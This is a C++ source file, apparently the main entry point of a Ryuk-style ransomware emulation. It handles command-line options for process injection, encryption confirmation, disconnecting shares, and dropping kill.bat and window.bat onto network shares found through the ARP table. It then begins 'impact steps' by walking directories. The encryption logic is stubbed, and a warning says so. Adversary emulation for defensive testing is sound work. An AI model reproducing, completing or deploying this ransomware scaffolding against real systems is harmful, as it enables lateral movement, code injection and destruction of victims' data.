#include "bat_actions.h"
#include "file_encryption.h"
#include "mount_share_operations.h"

/*
 * Prints executable usage documentation
 */
static void ShowUsage(std::wstring name)
{
    _ftprintf_s(
        stdout,
        TEXT("Usage: %s <option(s)>\n"
             "Options:\n"
             "\t-h,--help\t\tShow this help message\n"
             "\t-e,--encrypt\t\tConfirm you want to encrypt this system\n"
             "\t-p,--process-name\tThe process name to search and perform process injection (case sensitive)\n"
             "\t--disconnect-shares\tDisconnect shares, this is a separate option just in case you need to reset.\n"
             "\t--drop-bat-files\tDrops kill.bat and window.bat into C:/Users/Public, it will perform the network share discovery.\n\n"
        ),
        name.c_str()
    );
}

/*
 * Main entry point for the ransomware 
 */
int wmain(int argc, wchar_t* argv[])
{
    std::wstring arg;
    INT returnCode = 0;
    BOOL bConfirmEncrypt = FALSE;
    DWORD dwDiscoveryAndDirectoryWalk = 0L;
    TCHAR processName[MAX_PATH]{};

    _ftprintf_s(stderr, TEXT("IMPORTANT! - The encryption logic needs to be implemented for this sample.\n"));

    if (argc < 2)
    {
      ShowUsage(argv[0]);
      returnCode = -5;
      return returnCode;
    }

    for (int n = 1; n < argc; n++)
    {
        arg = argv[n];

        if ((arg == TEXT("-h")) || (arg == TEXT("--help")))
        {
            ShowUsage(argv[0]);
            return returnCode;
        }
        else if ((arg == TEXT("-e")) || (arg == TEXT("--encrypt")))
        {
            bConfirmEncrypt = TRUE;
        }
        else if ((arg == TEXT("--drop-bat-files")))
        {
            std::vector<CHAR*> ipResources;
            std::vector<LPNETRESOURCE> resourceList;
            std::vector<std::wstring> mountedDriveLetters;

            ryuk::GetARPTableAddresses(&ipResources);
            ryuk::LoopAndAttemptDriveMountOnAddresses(&ipResources, &resourceList, &mountedDriveLetters);

            ryuk::KillBATOperations(&mountedDriveLetters);
            ryuk::WindowBATOperations(&mountedDriveLetters);

            ryuk::ClearIPResources(&ipResources);
            ryuk::ClearNetResources(&resourceList);
            mountedDriveLetters.clear();
            return returnCode;
        }
        else if ((arg == TEXT("-p")) || (arg == TEXT("--process-name")))
        {
            if (n + 1 == argc)
            {
                _ftprintf_s(stderr, TEXT("argument '--process-name' required for execution!"));
                returnCode = -2;
                return returnCode;
            }
            else
            {
                _tcsncpy_s(processName, argv[n + 1], MAX_PATH - 1);
            }
        }
        else if ((arg == TEXT("--disconnect-shares")))
        {
            std::vector<CHAR*> ipResources;
            std::vector<LPNETRESOURCE> resourceList;

            ryuk::GetARPTableAddresses(&ipResources);
            ryuk::LoopAndAttemptDriveMountOnAddresses(&ipResources, &resourceList, nullptr);
            ryuk::LoopAndUnmountMappedDrives(&resourceList, FALSE);
            ryuk::ClearIPResources(&ipResources);
            ryuk::ClearNetResources(&resourceList);
            return returnCode;
        }
    }

    if (!bConfirmEncrypt)
    {
        _ftprintf_s(stderr, TEXT("-e,--encrypt option needed to confirm execution."));
        return returnCode;
    }

    _ftprintf_s(stdout, TEXT("Starting impact steps...\n"));

    dwDiscoveryAndDirectoryWalk = ryuk::DiscoveryAndDirectoryWalk(processName);
    if (dwDiscoveryAndDirectoryWalk != 0L)
    {
        _ftprintf_s(stdout, TEXT("DiscoveryAndDirectoryWalk failed...\n"));
        returnCode = -3;
    }

    return returnCode;
}
